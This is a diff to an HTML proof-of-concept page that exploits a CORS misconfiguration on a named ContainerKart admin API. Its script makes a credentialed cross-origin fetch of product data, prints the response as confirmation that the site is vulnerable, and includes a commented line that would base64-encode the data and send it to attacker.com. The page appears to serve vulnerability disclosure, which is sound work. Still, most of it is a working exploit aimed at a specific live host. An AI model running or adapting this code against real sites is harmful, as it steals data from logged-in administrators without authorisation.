@@ -3,25 +3,38 @@
 <head><title>CORS PoC</title></head>
 <body>
 <h2>CORS PoC - ContainerKart Admin</h2>
+<p>Simulates what happens when a logged-in admin visits a malicious page</p>
 <button onclick="exploit()">Run PoC</button>
 <pre id="output">Output will appear here...</pre>
 
 <script>
 function exploit() {
   document.getElementById("output").innerText = "Sending request...";
-  
+
   fetch("https://containerkart-admin.clicklogic.tech/api/v1/ckproducts/products/filter?page=1&per_page=15", {
     method: "GET",
     credentials: "include"
   })
-  .then(r => r.json())
+  .then(r => {
+    // Capture response headers for proof
+    console.log("CORS Header:", r.headers.get("Access-Control-Allow-Origin"));
+    return r.json();
+  })
   .then(data => {
-    // Display stolen data on page (for PoC demonstration)
-    document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-    console.log("Stolen data:", data);
+    document.getElementById("output").innerText = 
+      "✅ CORS CONFIRMED VULNERABLE\n\n" +
+      "Origin: https://stain404.github.io (untrusted)\n" +
+      "Credentials sent: YES\n" +
+      "Data received: YES\n\n" +
+      "Sample data:\n" + JSON.stringify(data, null, 2);
+
+    // In real attack - exfiltrate to attacker server:
+    // fetch("https://attacker.com/steal?d=" + btoa(JSON.stringify(data)));
   })
   .catch(err => {
-    document.getElementById("output").innerText = "Error: " + err;
+    document.getElementById("output").innerText = 
+      "Error (may still be vulnerable - check browser console):\n" + err;
+    console.error(err);
   });
 }
 </script>
